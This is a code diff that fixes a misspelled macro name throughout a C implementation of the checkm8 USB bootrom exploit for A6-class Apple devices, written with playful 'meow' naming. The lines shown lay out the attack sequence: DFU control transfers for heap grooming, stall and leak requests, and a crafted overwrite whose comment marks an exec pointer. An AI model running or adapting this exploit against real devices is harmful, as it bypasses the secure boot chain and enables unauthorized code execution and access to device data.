@@ -16,27 +16,27 @@ static unsigned char blank[DFU_MAX_TRANSFER_SZ];
 // checkm8 usb req
 __unused static transfer_t usb_req_stall(io_client_t client)
 {
-    return MEOW_CONTROL_TRANSFRE_TIME(client, 2, 3, 0x0000, 128, NULL, 0, 10);
+    return MEOW_CONTROL_TRANSFER_TIME(client, 2, 3, 0x0000, 128, NULL, 0, 10);
 }
 
 __unused static transfer_t usb_req_leak(io_client_t client, unsigned char* blank)
 {
-    return MEOW_CONTROL_TRANSFRE_TIME(client, 0x80, 6, 0x0304, 0x040a, blank, EP0_MAX_PACKET_SZ, 1);
+    return MEOW_CONTROL_TRANSFER_TIME(client, 0x80, 6, 0x0304, 0x040a, blank, EP0_MAX_PACKET_SZ, 1);
 }
 
 __unused static transfer_t usb_req_no_leak(io_client_t client, unsigned char* blank)
 {
-    return MEOW_CONTROL_TRANSFRE_TIME(client, 0x80, 6, 0x0304, 0x040a, blank, EP0_MAX_PACKET_SZ + 1, 1);
+    return MEOW_CONTROL_TRANSFER_TIME(client, 0x80, 6, 0x0304, 0x040a, blank, EP0_MAX_PACKET_SZ + 1, 1);
 }
 
 __unused static transfer_t leak(io_client_t client, unsigned char* blank)
 {
-    return MEOW_CONTROL_TRANSFRE_TIME(client, 0x80, 6, 0x0304, 0x040a, blank, 3 * EP0_MAX_PACKET_SZ, 1);
+    return MEOW_CONTROL_TRANSFER_TIME(client, 0x80, 6, 0x0304, 0x040a, blank, 3 * EP0_MAX_PACKET_SZ, 1);
 }
 
 __unused static transfer_t no_leak(io_client_t client, unsigned char* blank)
 {
-    return MEOW_CONTROL_TRANSFRE_TIME(client, 0x80, 6, 0x0304, 0x040a, blank, (3 * EP0_MAX_PACKET_SZ) + 1, 1);
+    return MEOW_CONTROL_TRANSFER_TIME(client, 0x80, 6, 0x0304, 0x040a, blank, (3 * EP0_MAX_PACKET_SZ) + 1, 1);
 }
 
 static void preRetry(io_client_t client, unsigned int i)
@@ -72,7 +72,7 @@ static int checkm8_a6meow(io_client_t client)
     MEOWWWW("Setting up the checkm8 meow");
     MEOWSET(&blank, '\0', DFU_MAX_TRANSFER_SZ);
     
-    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0x21, 1, 0x0000, 0x0000, blank, DFU_MAX_TRANSFER_SZ, 100);
+    result = MEOW_CONTROL_TRANSFER_TIME(client, 0x21, 1, 0x0000, 0x0000, blank, DFU_MAX_TRANSFER_SZ, 100);
     if(result.ret != kIOReturnSuccess)
     {
         ERROR("Failed to send meow");
@@ -86,7 +86,7 @@ static int checkm8_a6meow(io_client_t client)
     
     while(1)
     {
-        sent = MEOW_ASYNC_CONTROL_TRANSFRE_CANCEL(client, 0x21, 1, 0x0000, 0x0000, blank, push + 0x40, 1000000);
+        sent = MEOW_ASYNC_CONTROL_TRANSFER_CANCEL(client, 0x21, 1, 0x0000, 0x0000, blank, push + 0x40, 1000000);
         
         if(sent >= push)
             goto retry;
@@ -96,7 +96,7 @@ static int checkm8_a6meow(io_client_t client)
         
         DEVMEOW("Sent 0x%08x", (unsigned int)sent);
         
-        result = MEOW_CONTROL_TRANSFRE_TIME(client, 0, 0, 0x0000, 0x0000, blank, size, 100);
+        result = MEOW_CONTROL_TRANSFER_TIME(client, 0, 0, 0x0000, 0x0000, blank, size, 100);
         
         if(isStalled(result.ret))
             break;
@@ -107,24 +107,24 @@ static int checkm8_a6meow(io_client_t client)
     }
     
     MEOWSET(&blank, '\0', DFU_MAX_TRANSFER_SZ);
-    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0x21, 1, 0x0000, 0x0000, NULL, 0, 100);
-    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0xa1, 3, 0x0000, 0x0000, blank, 6, 100);
-    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0xa1, 3, 0x0000, 0x0000, blank, 6, 100);
+    result = MEOW_CONTROL_TRANSFER_TIME(client, 0x21, 1, 0x0000, 0x0000, NULL, 0, 100);
+    result = MEOW_CONTROL_TRANSFER_TIME(client, 0xa1, 3, 0x0000, 0x0000, blank, 6, 100);
+    result = MEOW_CONTROL_TRANSFER_TIME(client, 0xa1, 3, 0x0000, 0x0000, blank, 6, 100);
     
     while(1)
     {
-        sent = MEOW_ASYNC_CONTROL_TRANSFRE_CANCEL(client, 0x80, 6, 0x0304, 0x040a, blank, 128, 100);
+        sent = MEOW_ASYNC_CONTROL_TRANSFER_CANCEL(client, 0x80, 6, 0x0304, 0x040a, blank, 128, 100);
         DEVMEOW("Sent 0x%08x", (unsigned int)sent);
         
-        result = MEOW_CONTROL_TRANSFRE_TIME(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
+        result = MEOW_CONTROL_TRANSFER_TIME(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
         if(sent != 128 && isTimeout(result.ret))
             break;
     }
     
-    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0x02, 3, 0x0000, 128, NULL, 0, 10);
-    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0x02, 3, 0x0000, 128, NULL, 0, 10);
+    result = MEOW_CONTROL_TRANSFER_TIME(client, 0x02, 3, 0x0000, 128, NULL, 0, 10);
+    result = MEOW_CONTROL_TRANSFER_TIME(client, 0x02, 3, 0x0000, 128, NULL, 0, 10);
     
-    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0x80, 8, 0x0000, 0x0000, blank, 129, 100);
+    result = MEOW_CONTROL_TRANSFER_TIME(client, 0x80, 8, 0x0000, 0x0000, blank, 129, 100);
     
     usleep(500000);
     
@@ -149,9 +149,9 @@ static int checkm8_a6meow(io_client_t client)
     p[5] = 0x10000000; // <- exec :3
     p[6] = 0x00000000;
     
-    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0x02, 3, 0x0000, 128, NULL, 0, 10);
-    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0x02, 3, 0x0000, 128, NULL, 0, 10);
-    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0, 0, 0x0000, 0x0000, (unsigned char *)p, 4 * 7, 100);
+    result = MEOW_CONTROL_TRANSFER_TIME(client, 0x02, 3, 0x0000, 128, NULL, 0, 10);
+    result = MEOW_CONTROL_TRANSFER_TIME(client, 0x02, 3, 0x0000, 128, NULL, 0, 10);
+    result = MEOW_CONTROL_TRANSFER_TIME(client, 0, 0, 0x0000, 0x0000, (unsigned char *)p, 4 * 7, 100);
     
     {
         size_t len = 0;
@@ -164,9 +164,9 @@ static int checkm8_a6meow(io_client_t client)
     }
     
     MEOWSET(&blank, '\0', DFU_MAX_TRANSFER_SZ);
-    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0x21, 1, 0x0000, 0x0000, NULL, 0, 100);
-    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0xa1, 3, 0x0000, 0x0000, blank, 6, 100);
-    result = MEOW_CONTROL_TRANSFRE_TIME(client, 0xa1, 3, 0x0000, 0x0000, blank, 6, 100);
+    result = MEOW_CONTROL_TRANSFER_TIME(client, 0x21, 1, 0x0000, 0x0000, NULL, 0, 100);
+    result = MEOW_CONTROL_TRANSFER_TIME(client, 0xa1, 3, 0x0000, 0x0000, blank, 6, 100);
+    result = MEOW_CONTROL_TRANSFER_TIME(client, 0xa1, 3, 0x0000, 0x0000, blank, 6, 100);
     
     usleep(1000000);
     
